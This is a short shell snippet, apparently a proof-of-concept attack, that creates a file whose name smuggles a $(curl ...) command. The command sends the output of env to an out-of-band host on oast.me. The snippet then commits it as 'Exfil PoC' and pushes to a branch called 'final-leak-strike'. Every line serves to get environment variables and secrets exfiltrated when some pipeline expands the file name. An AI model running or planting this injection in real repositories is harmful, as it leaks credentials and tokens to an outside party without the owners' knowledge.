touch 'exploit-$(curl https://d0gvbmda9dbu4e87p8s0tmcs9hnzmipnz.oast.me/file-$(env)).nix'
git add .
git commit -m "Exfil PoC"
git push origin final-leak-strike
